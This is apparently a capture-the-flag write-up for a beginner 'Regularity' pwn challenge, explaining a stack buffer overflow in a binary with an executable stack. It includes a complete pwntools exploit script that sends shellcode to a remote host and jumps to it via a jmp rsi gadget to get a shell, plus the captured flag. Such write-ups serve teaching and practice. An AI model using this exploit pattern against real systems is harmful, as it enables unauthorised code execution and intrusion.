# Challenge: Regularity (Pwn)

## Challenge Overview

**Name:** Regularity  
**Category:** Pwn  
**Difficulty:** Very Easy

### Description:

Nothing much changes from day to day. Famine, conflict, hatred – it's all part of the lives we live now. We've grown used to the animosity we experience every day, and that's why it's so nice to have a useful program that asks how I'm doing. It's not the most talkative, though, but it's the highest level of tech most of us will ever see...

---

# Writeup

## Binary Analysis

### Binary Protections

```bash
checksec --file=regularity
````

Output:

* No PIE
* No NX
* No Stack Canary

> Shellcode injection is possible because the **stack is executable** and there’s **no NX protection**.

---

Inside the `_start` function, the program:

* Prints a welcome message using `write()`
* Reads user input using `read()` into the stack
* Writes again, and then executes `jmp rsi` (jump to exit)

```asm
sub rsp, 0x100        ; allocate buffer on stack
read(0, rsp, 0x110)   ; read 0x110 bytes → buffer overflow of 0x10 bytes
```

We can overwrite the return address, and `rsi` points directly to our buffer!

---

## Exploitation Strategy

1. Inject **shellcode** into the buffer (stack)
2. Overwrite the return address with the address of `jmp rsi` (available in the binary)
3. Since `rsi` points to our shellcode, it will jump to and execute it — giving us a shell

---

## Exploit Script

```python
from pwn import *

context.binary = elf = ELF('./regularity', checksec=False)

p = remote('94.237.120.190', 44450)

JMP_RSI = next(elf.search(asm('jmp rsi')))

payload = flat({
    0:      asm(shellcraft.sh()), 
    0x100:  JMP_RSI               
})

p.sendlineafter(b'days?\n', payload)
p.interactive()
```

---

## Flag

After successfully gaining a shell:

```bash
$ whoami
root
$ ls
flag.txt
$ cat flag.txt
HTB{juMp1nG_w1tH_tH3_r3gIsT3rS?_083fcf371598a34f1e45b7aa36ff6576}
```

May god with us~